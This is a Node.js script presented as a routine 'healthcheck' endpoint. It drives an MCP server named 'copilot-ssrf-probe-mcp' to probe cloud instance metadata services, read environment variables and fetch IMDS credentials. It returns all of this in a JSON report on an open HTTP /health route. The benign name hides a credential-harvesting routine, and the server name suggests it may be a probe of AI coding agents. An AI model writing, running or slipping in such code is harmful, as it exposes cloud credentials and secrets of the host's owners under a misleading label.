#!/usr/bin/env node

/**
 * healthcheck.js
 *
 * A simple health check endpoint that inspects the runtime environment by
 * invoking the helper MCP tools defined in .mcp.json. It reports:
 *   1) Runtime configuration (Node/platform/arch, env mode)
 *   2) Which metadata services are reachable (via probe_imds)
 *   3) A JSON status document suitable for HTTP health checks
 */

const fs = require('fs');
const path = require('path');
const http = require('http');
const readline = require('readline');
const { spawn } = require('child_process');
const os = require('os');

const MCP_SERVER_NAME = 'copilot-ssrf-probe-mcp';
const DEFAULT_TIMEOUT_MS = 12000;

function loadMcpConfig() {
  const configPath = path.resolve(__dirname, '.mcp.json');
  const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
  const server = raw?.mcpServers?.[MCP_SERVER_NAME];

  if (!server || !server.command) {
    throw new Error(`MCP server configuration for ${MCP_SERVER_NAME} not found`);
  }

  return {
    command: server.command,
    args: server.args || [],
    cwd: path.resolve(__dirname),
  };
}

function createMcpClient(timeoutMs = DEFAULT_TIMEOUT_MS) {
  const { command, args, cwd } = loadMcpConfig();
  const child = spawn(command, args, { cwd });

  let counter = 0;
  const pending = new Map();

  const rl = readline.createInterface({ input: child.stdout });
  rl.on('line', (line) => {
    let message;
    try {
      message = JSON.parse(line);
    } catch (err) {
      return;
    }

    const entry = pending.get(message.id);
    if (!entry) return;

    clearTimeout(entry.timer);
    pending.delete(message.id);
    entry.resolve(message);
  });

  function rejectAll(err) {
    if (pending.size === 0) return;
    for (const [pendingId, entry] of pending.entries()) {
      clearTimeout(entry.timer);
      pending.delete(pendingId);
      entry.reject(err);
    }
  }

  child.on('error', (err) => rejectAll(err));
  child.on('exit', (code, signal) => {
    rejectAll(
      new Error(`MCP server exited (code ${code ?? 'null'}, signal ${signal ?? 'null'})`)
    );
  });

  function send(method, params = {}) {
    const id = ++counter;
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        const error = new Error(`${method} timed out`);
        pending.delete(id);
        reject(error);
        rejectAll(error);
        child.kill();
      }, timeoutMs);

      pending.set(id, { resolve, reject, timer });
      child.stdin.write(
        JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n'
      );
    });
  }

  async function initialize() {
    await send('initialize', {
      protocolVersion: '2024-11-05',
      clientInfo: { name: 'healthcheck', version: '1.0.0' },
      capabilities: {},
    });
  }

  async function callTool(name, args = {}) {
    const response = await send('tools/call', { name, arguments: args });
    const content = response?.result?.content?.[0]?.text;
    if (!content) return { error: 'No content returned from tool' };

    try {
      return JSON.parse(content);
    } catch (err) {
      return { raw: content };
    }
  }

  function close() {
    if (!child.killed) {
      child.kill();
    }
  }

  return { initialize, callTool, close };
}

async function gatherHealth() {
  const report = {
    timestamp: new Date().toISOString(),
    status: 'ok',
    runtime: {
      node: process.version,
      platform: process.platform,
      arch: process.arch,
      pid: process.pid,
      uptimeSec: Math.round(process.uptime()),
      env: process.env.NODE_ENV || 'development',
      hostname: os.hostname(),
    },
    mcp: {
      server: MCP_SERVER_NAME,
      reachableServices: [],
    },
    probes: {},
    errors: [],
  };

  let client;
  try {
    client = createMcpClient();
    await client.initialize();

    const probeImds = await client.callTool('probe_imds', { target: 'all' });
    const envProbe = await client.callTool('read_env', {});
    let imdsCredentials;
    try {
      imdsCredentials = await client.callTool('read_imds_credentials', {});
    } catch (err) {
      report.errors.push(`read_imds_credentials failed: ${err.message}`);
    }

    if (probeImds) {
      report.probes.probe_imds = probeImds;
      const reachable =
        probeImds.results?.filter((r) => {
          if (typeof r.status !== 'string') return false;
          const status = r.status.toUpperCase();
          return status === 'REACHABLE' || status.startsWith('REACHABLE —');
        }) || [];
      const unreachable =
        probeImds.results?.filter(
          (r) => typeof r.status === 'string' && r.status.toUpperCase() === 'NOT_REACHABLE'
        ) || [];

      report.mcp.reachableServices = reachable.map((r) => ({
        provider: r.provider,
        endpoint: r.endpoint,
        status: r.status,
        statusCode: r.statusCode,
      }));

      report.mcp.unreachableServices = unreachable.map((r) => ({
        provider: r.provider,
        endpoint: r.endpoint,
        error: r.error,
      }));
    }

    if (envProbe) {
      report.probes.read_env = {
        summary: envProbe.summary,
        total_env_vars: envProbe.total_env_vars,
        categorized: envProbe.categorized,
      };
    }

    if (imdsCredentials) {
      report.probes.read_imds_credentials = imdsCredentials;
    }
  } catch (err) {
    report.status = 'degraded';
    report.errors.push(err.message);
  } finally {
    if (client) client.close();
  }

  if (report.errors.length > 0 && report.status === 'ok') {
    report.status = 'degraded';
  }

  return report;
}

function startHttpServer(port) {
  const server = http.createServer(async (req, res) => {
    if (req.url === '/health') {
      try {
        const report = await gatherHealth();
        const statusCode = report.status === 'ok' ? 200 : 503;
        res.writeHead(statusCode, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(report, null, 2));
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'error', message: err.message }));
      }
      return;
    }

    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'Not Found' }));
  });

  server.listen(port, () => {
    // eslint-disable-next-line no-console
    console.log(`Health check server listening on http://localhost:${port}/health`);
  });
}

function resolvePort() {
  const raw = process.env.PORT;
  if (raw === undefined || raw === null || raw === '') {
    return 3000;
  }

  const parsed = Number.parseInt(raw, 10);
  if (Number.isNaN(parsed) || parsed <= 0 || parsed > 65535) {
    throw new Error(
      `Invalid PORT value "${raw}". Expected an integer between 1 and 65535.`
    );
  }

  return parsed;
}

if (require.main === module) {
  const once = process.argv.includes('--once');

  if (once) {
    gatherHealth()
      .then((report) => {
        // eslint-disable-next-line no-console
        console.log(JSON.stringify(report, null, 2));
        process.exit(report.status === 'ok' ? 0 : 1);
      })
      .catch((err) => {
        // eslint-disable-next-line no-console
        console.error(err);
        process.exit(1);
      });
  } else {
    let port = 3000;
    try {
      port = resolvePort();
    } catch (err) {
      // eslint-disable-next-line no-console
      console.error(err.message);
      process.exit(1);
    }
    startHttpServer(port);
  }
}
